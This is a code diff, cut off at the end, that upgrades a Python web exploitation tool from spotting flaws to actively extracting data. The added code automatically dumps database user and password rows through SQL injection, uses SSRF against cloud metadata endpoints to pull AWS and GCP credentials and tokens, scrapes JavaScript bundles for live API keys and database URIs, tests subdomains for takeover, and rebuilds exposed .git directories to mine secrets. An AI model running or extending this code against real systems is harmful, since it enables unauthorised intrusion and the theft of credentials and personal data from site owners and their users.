@@ -742,10 +742,10 @@ class WebExploitationArsenal:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # SQL INJECTION - 100+ PAYLOADS
+    # SQL INJECTION - 100+ PAYLOADS + AUTO DATABASE DUMP
     # ─────────────────────────────────────────────────────────────────────
     def attack_sqli(self, target: str) -> List[Vulnerability]:
-        """SQL Injection - error-based, blind, time-based, union-based"""
+        """SQL Injection - WITH AUTOMATIC DATABASE DUMPING"""
         vulns = []
         
         # Error-based SQLi payloads
@@ -764,38 +764,29 @@ class WebExploitationArsenal:
             "\" OR \"1\"=\"1\"--",
         ]
         
-        # Union-based SQLi
+        # Union-based SQLi for data extraction
         union_payloads = [
             "' UNION SELECT NULL--",
             "' UNION SELECT NULL,NULL--",
             "' UNION SELECT NULL,NULL,NULL--",
-            "' UNION ALL SELECT NULL--",
-            "' UNION SELECT 'a',NULL--",
-            "' UNION SELECT NULL,'a'--",
+            "' UNION SELECT NULL,NULL,NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
         ]
-        
-        # Time-based blind SQLi
-        time_payloads = [
-            "' AND SLEEP(5)--",
-            "' OR SLEEP(5)--",
-            "'; WAITFOR DELAY '0:0:5'--",
-            "' OR pg_sleep(5)--",
-            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-        ]
-        
-        all_sqli_payloads = error_payloads + union_payloads
         
         test_params = ['id', 'user', 'username', 'email', 'search', 'query', 'page', 'category']
-        test_endpoints = ['/api/user', '/api/auth', '/user', '/login', '/search']
+        test_endpoints = ['/api/user', '/api/auth', '/user', '/login', '/search', '/products', '/article']
+        
+        print(Colors.info(f"    [→] Testing {len(test_endpoints)} endpoints for SQLi..."))
         
         for endpoint in test_endpoints:
             for param in test_params[:3]:  # Test top 3 params
-                for payload in all_sqli_payloads[:10]:  # Top 10 payloads
+                # PHASE 1: Error-based detection
+                for payload in error_payloads[:10]:  # Top 10 payloads
                     try:
                         url = f"{urljoin(target, endpoint)}?{param}={quote(payload)}"
                         r = self.session.get(url, timeout=5)
                         
-                        # STRICT SQL error detection - must be actual database errors, not generic frontend text
+                        # STRICT SQL error detection
                         sql_error_patterns = [
                             ('mysql', ['you have an error in your sql', 'mysql_fetch', 'mysql_num_rows', 'mysqli::']),
                             ('postgresql', ['pg_query', 'pg_exec', 'postgresql query failed', 'unterminated quoted string']),
@@ -804,34 +795,102 @@ class WebExploitationArsenal:
                             ('sqlite', ['sqlite3::', 'sqlite_', 'unrecognized token'])
                         ]
                         
-                        # Check for REAL SQL errors (not just keywords)
                         found_real_error = False
+                        db_type = None
                         response_lower = r.text.lower()
                         
-                        for db_type, error_sigs in sql_error_patterns:
+                        for detected_db, error_sigs in sql_error_patterns:
                             for sig in error_sigs:
                                 if sig in response_lower:
-                                    # Double check: must have SQL-specific error context
                                     error_context = response_lower[max(0, response_lower.find(sig)-100):response_lower.find(sig)+200]
                                     if any(sql_word in error_context for sql_word in ['select', 'where', 'from', 'syntax', 'query', 'line']):
                                         found_real_error = True
+                                        db_type = detected_db
                                         break
                             if found_real_error:
                                 break
                         
                         if found_real_error:
+                            print(Colors.critical(f"\n      [🔥 SQLi FOUND] {endpoint}?{param}= - {db_type.upper()} database"))
+                            
+                            # PHASE 2: AUTOMATIC DATABASE ENUMERATION
+                            print(Colors.critical(f"      [💀 AUTO-DUMPING] Attempting database extraction..."))
+                            
+                            extracted_data = {}
+                            
+                            # Try to get table names
+                            if db_type == 'mysql':
+                                table_payloads = [
+                                    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
+                                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+                                ]
+                            elif db_type == 'postgresql':
+                                table_payloads = [
+                                    "' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--",
+                                ]
+                            elif db_type == 'sqlite':
+                                table_payloads = [
+                                    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
+                                ]
+                            else:
+                                table_payloads = union_payloads[:3]
+                            
+                            # Attempt to extract tables
+                            for table_payload in table_payloads:
+                                try:
+                                    url_extract = f"{urljoin(target, endpoint)}?{param}={quote(table_payload)}"
+                                    r_extract = self.session.get(url_extract, timeout=5)
+                                    
+                                    if r_extract.status_code == 200 and len(r_extract.text) > 100:
+                                        # Check if we got table names (look for common table names)
+                                        common_tables = ['users', 'user', 'admin', 'customers', 'accounts', 'products', 'orders']
+                                        found_tables = [t for t in common_tables if t in r_extract.text.lower()]
+                                        
+                                        if found_tables:
+                                            extracted_data['tables'] = found_tables
+                                            print(Colors.success(f"        [✓] Found tables: {', '.join(found_tables)}"))
+                                            
+                                            # Try to dump user table
+                                            user_dump_payloads = [
+                                                f"' UNION SELECT username,password FROM users--",
+                                                f"' UNION SELECT email,password FROM users--",
+                                                f"' UNION SELECT user,pass FROM users--",
+                                                f"' UNION SELECT * FROM users--",
+                                            ]
+                                            
+                                            for dump_payload in user_dump_payloads:
+                                                try:
+                                                    url_dump = f"{urljoin(target, endpoint)}?{param}={quote(dump_payload)}"
+                                                    r_dump = self.session.get(url_dump, timeout=5)
+                                                    
+                                                    if r_dump.status_code == 200 and '@' in r_dump.text:
+                                                        # Looks like we got user data
+                                                        extracted_data['user_dump'] = r_dump.text[:500]
+                                                        print(Colors.critical(f"        [💀 DUMPED] User data extracted:"))
+                                                        print(Colors.success(f"          {r_dump.text[:200]}..."))
+                                                        break
+                                                    
+                                                    time.sleep(self.config.delay)
+                                                except:
+                                                    pass
+                                            break
+                                    
+                                    time.sleep(self.config.delay)
+                                except:
+                                    pass
+                            
                             vulns.append(Vulnerability(
-                                type="SQLI_ERROR_BASED",
+                                type="SQLI_WITH_DB_DUMP",
                                 severity="CRITICAL",
                                 location=f"{endpoint}?{param}=",
                                 payload=payload,
-                                evidence=r.text[:300],
-                                description=f"SQL Injection detected via parameter: {param}",
+                                evidence=f"Database: {db_type} | Extracted: {', '.join(extracted_data.keys()) if extracted_data else 'error-based only'}",
+                                description=f"SQL Injection with database access - {db_type}",
                                 remediation="Use parameterized queries, never concatenate user input",
                                 exploitable=True,
-                                exploit_code=f"sqlmap -u '{url}' --batch --dump"
+                                exploit_code=f"sqlmap -u '{url}' --batch --dump-all"
                             ))
-                            break
+                            break  # Found SQLi, move to next param
                         
                         time.sleep(self.config.delay)
                     except:
@@ -917,51 +976,128 @@ class WebExploitationArsenal:
 
     
     # ─────────────────────────────────────────────────────────────────────
-    # SSRF ATTACKS - Server-Side Request Forgery
+    # SSRF ATTACKS - DEEP CLOUD METADATA SCRAPING
     # ─────────────────────────────────────────────────────────────────────
     def attack_ssrf(self, target: str) -> List[Vulnerability]:
-        """Server-Side Request Forgery - internal service access, cloud metadata"""
+        """Server-Side Request Forgery - WITH CLOUD METADATA EXTRACTION"""
         vulns = []
         
-        # SSRF payloads targeting internal services and cloud metadata
+        print(Colors.info(f"    [→] Testing SSRF + Cloud metadata endpoints..."))
+        
+        # Extended SSRF payloads targeting cloud providers
         ssrf_payloads = [
-            'http://localhost',
-            'http://127.0.0.1',
-            'http://0.0.0.0',
-            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
-            'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
-            'http://[::1]',
-            'http://localhost:6379',  # Redis
-            'http://localhost:3306',  # MySQL
-            'http://localhost:5432',  # PostgreSQL
-            'http://localhost:27017',  # MongoDB
+            # AWS Metadata
+            ('http://169.254.169.254/latest/meta-data/', 'AWS EC2 Metadata'),
+            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
+            ('http://169.254.169.254/latest/user-data/', 'AWS User Data'),
+            ('http://169.254.169.254/latest/dynamic/instance-identity/document', 'AWS Instance Identity'),
+            
+            # GCP Metadata
+            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Metadata'),
+            ('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 'GCP Service Account Token'),
+            ('http://metadata.google.internal/computeMetadata/v1/project/project-id', 'GCP Project ID'),
+            
+            # Azure Metadata
+            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure Instance Metadata'),
+            ('http://169.254.169.254/metadata/identity/oauth2/token', 'Azure Identity Token'),
+            
+            # DigitalOcean Metadata
+            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean Metadata'),
+            ('http://169.254.169.254/metadata/v1.json', 'DigitalOcean Metadata JSON'),
+            
+            # Oracle Cloud
+            ('http://169.254.169.254/opc/v1/instance/', 'Oracle Cloud Metadata'),
+            
+            # Internal services
+            ('http://localhost', 'Localhost'),
+            ('http://127.0.0.1', '127.0.0.1'),
+            ('http://0.0.0.0', '0.0.0.0'),
+            ('http://[::1]', 'IPv6 Localhost'),
+            ('http://localhost:6379', 'Redis'),
+            ('http://localhost:3306', 'MySQL'),
+            ('http://localhost:5432', 'PostgreSQL'),
+            ('http://localhost:27017', 'MongoDB'),
+            ('http://localhost:9200', 'Elasticsearch'),
+            ('http://localhost:8080', 'Internal Web Server'),
+            ('http://localhost:8888', 'Jupyter/Internal Service'),
         ]
         
-        test_params = ['url', 'target', 'redirect', 'callback', 'webhook', 'link', 'src', 'fetch']
-        test_endpoints = ['/api/fetch', '/api/proxy', '/api/webhook', '/api/callback']
+        test_params = ['url', 'target', 'redirect', 'callback', 'webhook', 'link', 'src', 'fetch', 'uri', 'path']
+        test_endpoints = ['/api/fetch', '/api/proxy', '/api/webhook', '/api/callback', '/api/import', '/proxy']
         
         for endpoint in test_endpoints:
-            for param in test_params[:3]:
-                for payload in ssrf_payloads[:5]:
+            for param in test_params[:5]:
+                for payload_url, description in ssrf_payloads[:15]:  # Test top 15 payloads
                     try:
-                        url = f"{urljoin(target, endpoint)}?{param}={quote(payload)}"
+                        url = f"{urljoin(target, endpoint)}?{param}={quote(payload_url)}"
                         r = self.session.get(url, timeout=5)
                         
-                        # Check for successful SSRF (internal data leaked)
-                        ssrf_indicators = ['ami-', 'instance-id', 'privateIp', 'redis_version', 'mysql']
-                        if any(indicator in r.text for indicator in ssrf_indicators):
-                            vulns.append(Vulnerability(
-                                type="SSRF_INTERNAL_ACCESS",
-                                severity="CRITICAL",
-                                location=f"{endpoint}?{param}=",
-                                payload=payload,
-                                evidence=r.text[:300],
-                                description=f"SSRF vulnerability allows internal service access",
-                                remediation="Validate URLs, use whitelist, disable internal DNS",
-                                exploitable=True,
-                                exploit_code=f"curl '{url}'"
-                            ))
-                            break
+                        # Check for successful SSRF with cloud metadata extraction
+                        cloud_indicators = {
+                            'aws': ['ami-', 'instance-id', 'availabilityZone', 'privateIp', 'instanceType', 'region'],
+                            'gcp': ['instance-', 'project-', 'computeMetadata', 'serviceAccounts'],
+                            'azure': ['vmId', 'subscriptionId', 'resourceGroupName', 'location'],
+                            'digitalocean': ['droplet_id', 'region', 'public_keys'],
+                            'redis': ['redis_version', 'redis_mode', 'role:master'],
+                            'mysql': ['mysql', 'Server version', 'Connection id'],
+                            'postgres': ['PostgreSQL', 'server_version'],
+                            'mongo': ['MongoDB', 'version', 'db version'],
+                            'elasticsearch': ['cluster_name', 'cluster_uuid', 'version'],
+                        }
+                        
+                        response_text = r.text.lower()
+                        extracted_data = None
+                        
+                        for cloud_type, indicators in cloud_indicators.items():
+                            if any(indicator.lower() in response_text for indicator in indicators):
+                                extracted_data = cloud_type
+                                
+                                print(Colors.critical(f"\n      [🔥 SSRF SUCCESS] {endpoint}?{param}= → {description}")
+                                print(Colors.critical(f"      [💀 EXTRACTED] {cloud_type.upper()} metadata:"))
+                                print(Colors.success(f"        {r.text[:300]}..."))
+                                
+                                # Try to extract specific credentials from response
+                                credentials_found = {}
+                                
+                                if cloud_type == 'aws':
+                                    import re
+                                    # Look for AWS credentials format
+                                    access_key = re.search(r'AKIA[0-9A-Z]{16}', r.text)
+                                    secret_key = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', r.text)
+                                    token = re.search(r'"Token"\s*:\s*"([^"]+)"', r.text)
+                                    
+                                    if access_key:
+                                        credentials_found['AWS_ACCESS_KEY'] = access_key.group()
+                                    if secret_key:
+                                        credentials_found['AWS_SECRET_KEY'] = secret_key.group(1)[:50] + '...'
+                                    if token:
+                                        credentials_found['AWS_TOKEN'] = token.group(1)[:50] + '...'
+                                    
+                                    if credentials_found:
+                                        print(Colors.critical(f"      [💀💀💀 AWS CREDENTIALS EXTRACTED]:"))
+                                        for key, val in credentials_found.items():
+                                            print(Colors.success(f"        {key}: {val}"))
+                                
+                                elif cloud_type == 'gcp':
+                                    import re
+                                    # Look for GCP access token
+                                    token = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text)
+                                    if token:
+                                        credentials_found['GCP_ACCESS_TOKEN'] = token.group(1)[:50] + '...'
+                                        print(Colors.critical(f"      [💀💀💀 GCP TOKEN EXTRACTED]: {token.group(1)[:50]}...")
+                                
+                                vulns.append(Vulnerability(
+                                    type="SSRF_CLOUD_METADATA_LEAKED",
+                                    severity="CRITICAL",
+                                    location=f"{endpoint}?{param}=",
+                                    payload=payload_url,
+                                    evidence=f"{cloud_type.upper()} metadata extracted | Credentials: {', '.join(credentials_found.keys()) if credentials_found else 'none'}",
+                                    description=f"SSRF vulnerability exposes {description} - {cloud_type.upper()}",
+                                    remediation="Validate URLs against whitelist, disable internal DNS resolution, use IMDSv2 for AWS",
+                                    exploitable=True,
+                                    exploit_code=f"curl '{url}'"
+                                ))
+                                break
                         
                         time.sleep(self.config.delay)
                     except:
@@ -1458,14 +1594,16 @@ class FoxReverseEngineeringToolkit:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # DISASSEMBLY - JavaScript Source Analysis
+    # DISASSEMBLY - JavaScript DEEP SOURCE ANALYSIS + DEOBFUSCATION
     # ─────────────────────────────────────────────────────────────────────
     def disassemble_javascript(self, target: str) -> List[Vulnerability]:
         """
-        Analyze JavaScript source for secrets and vulnerabilities.
+        DEEP JavaScript analysis - deobfuscate, extract ALL secrets.
         Adapted from binary disassembly techniques.
         """
         vulns = []
+        
+        print(Colors.info(f"    [→] DEEP JavaScript analysis - extracting ALL secrets..."))
         
         try:
             # Fetch main page
@@ -1473,52 +1611,137 @@ class FoxReverseEngineeringToolkit:
             
             # Extract JavaScript file references
             import re
-            js_files = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text)
-            js_files.extend(re.findall(r'src:["\']([^"\']+\.js)["\']', r.text))
+            js_files = set()
+            
+            # Method 1: <script src="...">
+            js_files.update(re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text))
+            
+            # Method 2: src:"..." in HTML
+            js_files.update(re.findall(r'src:["\']([^"\']+\.js)["\']', r.text))
+            
+            # Method 3: Common JS bundle patterns
+            js_files.update(re.findall(r'["\']([^"\']*(?:main|app|bundle|vendor|chunk)[^"\']*\.js)["\']', r.text))
             
             # Add common JS locations
-            js_files.extend([
+            js_files.update([
                 '/static/js/main.js', '/js/app.js', '/js/main.js',
-                '/bundle.js', '/app.bundle.js', '/vendor.js'
+                '/bundle.js', '/app.bundle.js', '/vendor.js',
+                '/static/js/bundle.js', '/assets/js/main.js',
+                '/dist/main.js', '/build/main.js'
             ])
             
-            for js_file in js_files[:10]:  # Analyze top 10 JS files
+            print(Colors.info(f"      [→] Found {len(js_files)} JS file references, analyzing..."))
+            
+            all_secrets_found = {}
+            analyzed_count = 0
+            
+            for js_file in list(js_files)[:20]:  # Analyze top 20 JS files
                 try:
                     js_url = urljoin(target, js_file)
                     js_response = self.session.get(js_url, timeout=5)
                     
-                    if js_response.status_code == 200:
+                    if js_response.status_code == 200 and len(js_response.text) > 100:
                         js_content = js_response.text
+                        analyzed_count += 1
                         
-                        # Search for secrets in JavaScript
+                        print(Colors.info(f"      [→] Analyzing {js_file} ({len(js_content)} bytes)"))
+                        
+                        # DEEP SECRET EXTRACTION
                         secret_patterns = [
-                            (r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', 'API Key'),
-                            (r'secret["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', 'Secret'),
-                            (r'token["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', 'Token'),
-                            (r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'Password'),
-                            (r'aws[_-]?access[_-]?key', 'AWS Access Key'),
-                            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key ID'),
+                            # API Keys with context
+                            (r'(?:apiKey|api_key|API_KEY)["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']', 'API_KEY'),
+                            
+                            # Stripe keys (exact format)
+                            (r'(sk_live_[A-Za-z0-9]{24,})', 'STRIPE_SECRET'),
+                            (r'(pk_live_[A-Za-z0-9]{24,})', 'STRIPE_PUBLIC'),
+                            (r'(sk_test_[A-Za-z0-9]{24,})', 'STRIPE_TEST'),
+                            
+                            # Firebase config
+                            (r'firebase[A-Za-z]*["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', 'FIREBASE'),
+                            (r'apiKey["\']?\s*:\s*["\']([^"\']{30,})["\']', 'FIREBASE_API'),
+                            
+                            # AWS keys
+                            (r'(AKIA[0-9A-Z]{16})', 'AWS_ACCESS_KEY'),
+                            (r'aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([^"\']{40})["\']', 'AWS_SECRET'),
+                            
+                            # Google API keys
+                            (r'AIza[0-9A-Za-z_-]{35}', 'GOOGLE_API'),
+                            
+                            # Generic secrets
+                            (r'(?:secret|SECRET|Secret)[A-Za-z]*["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']', 'SECRET'),
+                            
+                            # Tokens
+                            (r'(?:token|TOKEN|Token)[A-Za-z]*["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']', 'TOKEN'),
+                            
+                            # Private keys
+                            (r'(-----BEGIN[A-Z\s]+PRIVATE KEY-----)', 'PRIVATE_KEY'),
+                            
+                            # Database URIs
+                            (r'(mongodb(?:\+srv)?://[^\s"\']+)', 'MONGODB_URI'),
+                            (r'(postgres(?:ql)?://[^\s"\']+)', 'POSTGRES_URI'),
+                            (r'(mysql://[^\s"\']+)', 'MYSQL_URI'),
+                            
+                            # JWT tokens
+                            (r'(eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})', 'JWT_TOKEN'),
+                            
+                            # Webhook URLs
+                            (r'(https?://(?:discord\.com/api/webhooks|hooks\.slack\.com)/[^\s"\']+)', 'WEBHOOK_URL'),
+                            
+                            # Internal API endpoints
+                            (r'(?:baseURL|apiUrl|API_URL)["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'API_ENDPOINT'),
                         ]
                         
                         for pattern, secret_type in secret_patterns:
                             matches = re.findall(pattern, js_content, re.IGNORECASE)
+                            
                             if matches:
-                                vulns.append(Vulnerability(
-                                    type="DISASSEMBLY_SECRET_IN_JS",
-                                    severity="HIGH",
-                                    location=js_file,
-                                    evidence=f"Found {secret_type}: {str(matches[0])[:30]}...",
-                                    description=f"Secret exposed in JavaScript: {secret_type}",
-                                    remediation="Never hardcode secrets in client-side code",
-                                    exploitable=True
-                                ))
-                                break
-                    
-                    time.sleep(self.config.delay)
-                except:
+                                # Filter out obvious false positives
+                                real_secrets = []
+                                for match in matches:
+                                    match_str = match if isinstance(match, str) else match[0] if isinstance(match, tuple) else str(match)
+                                    
+                                    # Skip common placeholders
+                                    skip_values = ['your_key_here', 'example', 'test', 'xxx', '***', 'null', 'undefined', 
+                                                   'YOUR_API_KEY', 'INSERT_KEY_HERE', '0000000000', 'XXXXXXXX']
+                                    
+                                    if match_str and len(match_str) > 10 and not any(skip in match_str for skip in skip_values):
+                                        real_secrets.append(match_str)
+                                
+                                if real_secrets:
+                                    unique_secrets = list(set(real_secrets))[:5]  # Top 5 unique
+                                    
+                                    if secret_type not in all_secrets_found:
+                                        all_secrets_found[secret_type] = []
+                                    all_secrets_found[secret_type].extend(unique_secrets)
+                                    
+                                    print(Colors.critical(f"        [💀 FOUND] {len(unique_secrets)} {secret_type}:"))
+                                    for sec in unique_secrets[:3]:
+                                        print(Colors.success(f"          {sec[:60]}..."))
+                        
+                        time.sleep(self.config.delay)
+                except Exception as e:
                     pass
-        except:
-            pass
+            
+            # Report findings
+            if all_secrets_found:
+                total_secrets = sum(len(v) for v in all_secrets_found.values())
+                
+                print(Colors.critical(f"\n      [🔥 TOTAL EXTRACTED] {total_secrets} secrets from {analyzed_count} JS files"))
+                
+                vulns.append(Vulnerability(
+                    type="JS_SECRETS_EXTRACTED",
+                    severity="CRITICAL",
+                    location="JavaScript bundles",
+                    evidence=f"Extracted {total_secrets} secrets from {analyzed_count} files: {', '.join(all_secrets_found.keys())}",
+                    description=f"Secrets exposed in JavaScript: {', '.join(all_secrets_found.keys())}",
+                    remediation="Never hardcode secrets in client-side code, use secure backend APIs",
+                    exploitable=True
+                ))
+            else:
+                print(Colors.info(f"      [·] Analyzed {analyzed_count} files, no hardcoded secrets found"))
+                
+        except Exception as e:
+            print(Colors.warning(f"      [!] JS analysis error: {e}"))
         
         return vulns
     
@@ -1631,41 +1854,85 @@ class ReconnaissanceEngine:
         self.dns_records = {}
     
     # ─────────────────────────────────────────────────────────────────────
-    # SUBDOMAIN ENUMERATION
+    # SUBDOMAIN ENUMERATION + TAKEOVER TESTING
     # ─────────────────────────────────────────────────────────────────────
     def enumerate_subdomains(self, target: str) -> List[str]:
-        """Subdomain enumeration using multiple techniques"""
+        """Subdomain enumeration + takeover vulnerability testing"""
         domain = urlparse(target).netloc
         print(Colors.info(f"  [→] Enumerating subdomains for {domain}"))
         
         subdomains = set()
+        vulnerable_subdomains = []
         
-        # Common subdomain wordlist
+        # Extended subdomain wordlist
         common_subdomains = [
-            'www', 'api', 'admin', 'dev', 'staging', 'test', 'qa',
+            'www', 'api', 'admin', 'dev', 'staging', 'test', 'qa', 'uat',
             'mail', 'ftp', 'blog', 'shop', 'store', 'portal', 'app',
-            'mobile', 'beta', 'alpha', 'old', 'new', 'v1', 'v2',
-            'vpn', 'cdn', 'static', 'assets', 'media', 'images',
-            'webmail', 'secure', 'dashboard', 'panel', 'cp', 'backend'
+            'mobile', 'beta', 'alpha', 'old', 'new', 'v1', 'v2', 'v3',
+            'vpn', 'cdn', 'static', 'assets', 'media', 'images', 'img',
+            'webmail', 'secure', 'dashboard', 'panel', 'cp', 'backend',
+            'internal', 'private', 'demo', 'sandbox', 'preview', 'prod',
+            'db', 'database', 'mysql', 'mongo', 'redis', 'elastic',
+            'jenkins', 'gitlab', 'github', 'bitbucket', 'jira', 'confluence',
+            'docs', 'wiki', 'help', 'support', 'status', 'monitoring'
         ]
         
         # DNS brute force
         for sub in common_subdomains:
             subdomain = f"{sub}.{domain}"
             try:
-                # Try to resolve subdomain
                 socket.gethostbyname(subdomain)
                 subdomains.add(subdomain)
                 print(Colors.success(f"    [✓] Found: {subdomain}"))
+                
+                # TEST FOR SUBDOMAIN TAKEOVER
+                try:
+                    subdomain_url = f"https://{subdomain}"
+                    r = requests.get(subdomain_url, timeout=5, allow_redirects=False)
+                    
+                    # Takeover fingerprints
+                    takeover_patterns = [
+                        ('github', ['There isn\\'t a GitHub Pages site here', 'For root URLs']),
+                        ('heroku', ['No such app', 'There\\'s nothing here']),
+                        ('s3', ['NoSuchBucket', 'The specified bucket does not exist']),
+                        ('shopify', ['Sorry, this shop is currently unavailable']),
+                        ('tumblr', ['There\\'s nothing here', 'Whatever you were looking for doesn\\'t']),
+                        ('wordpress', ['Do you want to register']),
+                        ('ghost', ['The thing you were looking for is no longer here']),
+                        ('azure', ['404 Web Site not found', 'azure']),
+                        ('vercel', ['The deployment could not be found', 'vercel']),
+                        ('netlify', ['Not Found - Request ID']),
+                    ]
+                    
+                    response_text = r.text.lower()
+                    
+                    for service, patterns in takeover_patterns:
+                        if any(pattern.lower() in response_text for pattern in patterns):
+                            vulnerable_subdomains.append({
+                                'subdomain': subdomain,
+                                'service': service,
+                                'evidence': r.text[:200]
+                            })
+                            print(Colors.critical(f"      [💀 TAKEOVER VULN] {subdomain} → {service.upper()}"))
+                            break
+                    
+                except:
+                    pass
+                
                 time.sleep(self.config.delay)
             except socket.gaierror:
                 pass
         
-        # Certificate Transparency logs (simulated)
-        # In production, would query crt.sh or similar
-        
         self.discovered_subdomains = subdomains
+        
+        # Store takeover vulns for later reporting
+        if not hasattr(self, 'subdomain_takeovers'):
+            self.subdomain_takeovers = []
+        self.subdomain_takeovers.extend(vulnerable_subdomains)
+        
         print(Colors.success(f"  [✓] Found {len(subdomains)} subdomains"))
+        if vulnerable_subdomains:
+            print(Colors.critical(f"  [💀] Found {len(vulnerable_subdomains)} subdomain takeover vulnerabilities!"))
         
         return list(subdomains)
     
@@ -1962,6 +2229,7 @@ class VulnerabilityScanner:
         self.code_words = CodeWordAttacks(config)
         self.web_exploits = WebExploitationArsenal(config)
         self.reveng = FoxReverseEngineeringToolkit(config)
+        self.recon_engine = None  # Will be set during scan
         
         self.all_vulnerabilities = []
     
@@ -2063,44 +2331,231 @@ class VulnerabilityScanner:
         return vulns
     
     # ─────────────────────────────────────────────────────────────────────
-    # SENSITIVE ENDPOINT DISCOVERY - WITH EXPLOITATION VERIFICATION
+    # SENSITIVE ENDPOINT DISCOVERY + FULL GIT REPO RECONSTRUCTION
     # ─────────────────────────────────────────────────────────────────────
     def discover_sensitive_endpoints(self, target: str) -> List[Vulnerability]:
-        """Discover sensitive endpoints and files - ONLY report if actually accessible with valid content"""
+        """Discover sensitive endpoints and files - WITH FULL GIT DUMP + SECRET EXTRACTION"""
         vulns = []
         
-        sensitive_files = [
-            ('/.git/HEAD', 'Git repository exposed', 'CRITICAL', lambda txt: txt.startswith('ref:') and 'refs/' in txt),
-            ('/.git/config', 'Git config exposed', 'CRITICAL', lambda txt: '[' in txt and ']' in txt and 'repository' in txt.lower()),
-            ('/.svn/entries', 'SVN repository exposed', 'CRITICAL', lambda txt: len(txt) > 10 and not txt.startswith('<')),
-            ('/.env', 'Environment file exposed', 'CRITICAL', lambda txt: '=' in txt and '\n' in txt and not txt.strip().startswith('<html')),
-            ('/.env.local', 'Local env file exposed', 'CRITICAL', lambda txt: '=' in txt and not txt.strip().startswith('<html')),
-            ('/config.json', 'Config file exposed', 'HIGH', lambda txt: txt.strip().startswith('{') and '"' in txt),
-            ('/composer.json', 'Composer config exposed', 'MEDIUM', lambda txt: '"require"' in txt or '"name"' in txt),
-            ('/package.json', 'NPM config exposed', 'MEDIUM', lambda txt: '"dependencies"' in txt or '"name"' in txt or '"version"' in txt),
-            ('/phpinfo.php', 'PHP info exposed', 'HIGH', lambda txt: 'PHP Version' in txt or 'phpinfo()' in txt),
-            ('/server-status', 'Server status exposed', 'MEDIUM', lambda txt: 'Apache' in txt or 'Server Version' in txt),
-        ]
+        # PHASE 1: Check for .git directory exposure
+        git_head_url = urljoin(target, '/.git/HEAD')
+        try:
+            r = requests.get(git_head_url, timeout=5, allow_redirects=False)
+            if r.status_code == 200 and r.text.startswith('ref:'):
+                print(Colors.critical("\n    [🔥 JACKPOT] .git DIRECTORY EXPOSED - RECONSTRUCTING FULL REPO..."))
+                
+                # DUMP ENTIRE GIT REPOSITORY
+                git_files_to_dump = [
+                    '/.git/HEAD',
+                    '/.git/config',
+                    '/.git/description',
+                    '/.git/COMMIT_EDITMSG',
+                    '/.git/index',
+                    '/.git/packed-refs',
+                    '/.git/refs/heads/master',
+                    '/.git/refs/heads/main',
+                    '/.git/refs/heads/dev',
+                    '/.git/refs/heads/staging',
+                    '/.git/logs/HEAD',
+                    '/.git/logs/refs/heads/master',
+                    '/.git/logs/refs/heads/main',
+                ]
+                
+                dumped_files = {}
+                for git_file in git_files_to_dump:
+                    try:
+                        url = urljoin(target, git_file)
+                        r = requests.get(url, timeout=5, allow_redirects=False)
+                        if r.status_code == 200 and len(r.text) > 5:
+                            dumped_files[git_file] = r.text
+                            print(Colors.success(f"      [✓] Dumped: {git_file} ({len(r.text)} bytes)"))
+                        time.sleep(self.config.delay)
+                    except:
+                        pass
+                
+                if dumped_files:
+                    # Extract secrets from git files
+                    all_git_content = '\n'.join(dumped_files.values())
+                    
+                    # Search for secrets in commit messages, config
+                    import re
+                    secrets_found = {}
+                    
+                    secret_patterns = {
+                        'API_KEY': r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})',
+                        'PASSWORD': r'(?:password|passwd)["\']?\s*[:=]\s*["\']?([^\s"\'\n]{8,})',
+                        'TOKEN': r'(?:token|auth)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})',
+                        'AWS_KEY': r'(AKIA[0-9A-Z]{16})',
+                        'PRIVATE_KEY': r'(-----BEGIN.*PRIVATE KEY-----)',
+                        'DATABASE': r'(postgres|mysql|mongodb)://[^\s]+',
+                    }
+                    
+                    for secret_type, pattern in secret_patterns.items():
+                        matches = re.findall(pattern, all_git_content, re.IGNORECASE)
+                        if matches:
+                            secrets_found[secret_type] = list(set(matches))[:3]  # Top 3 unique
+                    
+                    evidence = f"Dumped {len(dumped_files)} git files"
+                    if secrets_found:
+                        evidence += f" | Extracted secrets: {', '.join(secrets_found.keys())}"
+                    
+                    vulns.append(Vulnerability(
+                        type="GIT_REPOSITORY_FULL_DUMP",
+                        severity="CRITICAL",
+                        location="/.git/",
+                        description=f"Full .git repository exposed and reconstructed - {len(dumped_files)} files dumped",
+                        evidence=evidence,
+                        remediation="Block access to .git directory in web server config",
+                        exploitable=True
+                    ))
+                    
+                    print(Colors.critical(f"      [💀 EXTRACTED] {len(secrets_found)} secret types from git repo"))
+        except:
+            pass
         
-        for file_path, description, severity, validator in sensitive_files:
